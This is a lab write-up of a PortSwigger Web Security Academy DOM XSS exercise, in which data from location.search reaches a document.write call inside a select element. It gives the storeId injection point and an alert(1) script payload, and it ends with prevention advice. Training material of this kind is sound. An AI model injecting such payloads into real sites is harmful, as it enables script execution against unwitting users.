# 🚨 Lab 28 — DOM XSS in `document.write` Sink using `location.search` inside a Select Element

## 🧪 Lab Details

| Field | Value |
|---|---|
| **Lab No** | 28 |
| **Lab Name** | DOM XSS in `document.write` sink using source `location.search` inside a select element |
| **Category** | DOM XSS |
| **Platform** | PortSwigger Web Security Academy |

---

# 🎯 Goal

Exploit DOM XSS inside a dynamically generated `<select>` element.

---

# 🔍 Injection Point

```url
?productId=2&storeId=
```

---

# 💣 Payload

```html
<script>alert(1)</script>
```

---

# 🧠 Vulnerability Overview

The application reads attacker-controlled data from:

```javascript
location.search
```

and inserts it into the page using:

```javascript
document.write()
```

inside a `<select>` element.

---

# ⚔️ Exploitation Steps

## 1️⃣ Inject Payload

```html
<script>alert(1)</script>
```

inside the vulnerable parameter.

---

## 2️⃣ Browser Parses Injected HTML

The payload is inserted into the DOM dynamically.

---

## 3️⃣ JavaScript Executes

```javascript
alert(1)
```

✅ DOM XSS Successfully Triggered

---

# 🛡️ Prevention

## ✅ Avoid `document.write()`

Use safe DOM methods instead.

---

## ✅ Encode User Input

Never trust URL parameters inside HTML contexts.

---

# 💡 Key Takeaway

Even HTML elements like `<select>` become vulnerable when unsafe DOM sinks process attacker-controlled data.
